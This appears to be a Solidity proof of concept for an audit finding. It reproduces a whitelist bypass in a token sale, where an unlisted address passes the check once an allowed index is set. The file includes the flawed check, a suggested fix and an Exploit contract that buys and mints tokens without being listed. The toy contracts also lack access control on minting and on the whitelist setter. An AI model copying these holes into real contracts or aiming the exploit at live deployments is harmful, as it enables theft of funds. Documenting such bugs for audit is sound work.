// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract VULT { mapping(address=>uint256) public balanceOf; function mint(address to,uint256 a) external{balanceOf[to]+=a;} }
contract Whitelist {
    uint256 internal _allowedWhitelistIndex; mapping(address=>uint256) internal _whitelistIndex;
    error NotWhitelisted();
    function setAllowedWhitelistIndex(uint256 i) external {_allowedWhitelistIndex=i;}
    function checkWhitelist(address pool,address to,uint256 amount) public view { pool;amount; if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) { revert NotWhitelisted(); } // @> VULN: index zero (unlisted) passes whenever an allowed maximum is configured
        // FIX: if (_whitelistIndex[to] == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) revert NotWhitelisted();
    }
}
contract Sale { VULT public vult; Whitelist public whitelist; mapping(address=>uint256) public purchased; constructor(VULT v,Whitelist w){vult=v;whitelist=w;} function buy(uint256 amount) external { whitelist.checkWhitelist(address(this),msg.sender,amount); purchased[msg.sender]+=amount; vult.mint(msg.sender,amount); } }
contract Exploit { VULT public vult; Whitelist public whitelist; Sale public sale; uint256 public purchased; constructor(){vult=new VULT();whitelist=new Whitelist();sale=new Sale(vult,whitelist);} function run() external { whitelist.setAllowedWhitelistIndex(10); sale.buy(100); purchased=sale.purchased(address(this)); require(purchased==100,"unlisted purchase failed");require(vult.balanceOf(address(this))==100,"tokens not minted"); } }
